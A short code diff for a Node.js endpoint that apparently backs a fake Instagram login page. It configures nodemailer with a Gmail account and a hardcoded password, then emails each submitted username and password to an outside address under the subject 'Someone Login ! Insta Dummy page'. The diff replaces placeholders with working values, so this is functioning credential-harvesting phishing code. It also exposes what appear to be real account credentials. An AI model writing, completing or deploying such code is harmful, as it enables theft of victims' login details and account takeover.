@@ -17,16 +17,16 @@ app.post('/api/send', (req, res) => {
 
     // Email configuration (using your email service credentials)
     const transporter = nodemailer.createTransport({
-        service: 'YourEmailServiceProvider',
+        service: 'gmail',
         auth: {
-            user: 'exampl!!!',
+            user: 'jokercode551@gmail.com',
             pass: 'pank84@123'
         }
     });
 
     // Email content
     const mailOptions = {
-        from: 'your-email@example.com',
+        from: 'jokercode551@gmail.com',
         to: 'mangleshop028@gmail.com',
         subject: 'Someone Login ! Insta Dummy page',
         text: `Username: ${u_name}\nPassword: ${pass}`
